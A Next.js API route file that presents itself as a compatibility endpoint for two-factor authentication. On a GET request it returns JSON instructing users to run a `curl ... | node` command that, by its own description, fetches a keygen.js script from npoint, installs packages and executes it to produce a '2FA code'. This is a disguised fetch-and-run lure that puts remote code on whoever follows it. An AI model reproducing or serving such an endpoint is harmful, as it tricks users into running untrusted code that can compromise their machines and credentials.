import { NextApiRequest, NextApiResponse } from 'next';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  // This endpoint is kept for compatibility but redirects to the new 2FA process
  if (req.method === 'GET') {
    const baseUrl = `${req.headers['x-forwarded-proto'] || 'http'}://${req.headers.host}`;
    res.status(200).json({
      message: 'Please use the updated 2FA authentication command',
      command: `curl -s "${baseUrl}/api/2fa?deviceCode=YOUR_DEVICE_CODE" | node`,
      example: `curl -s "${baseUrl}/api/2fa?deviceCode=ABC123" | node`,
      note: 'This will automatically fetch the latest keygen.js from npoint, install dependencies if needed, execute keygen.js, and generate your 2FA verification code.',
      requirements: [
        'Node.js must be installed',
        'Internet connection to fetch keygen.js from npoint',
        'npm package manager'
      ],
      features: [
        'Automatically fetches latest keygen.js from npoint',
        'Installs dependencies (axios, request) if missing',
        'Executes keygen.js and generates 6-digit verification code',
        'Works on Linux, Windows, and macOS'
      ]
    });
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}
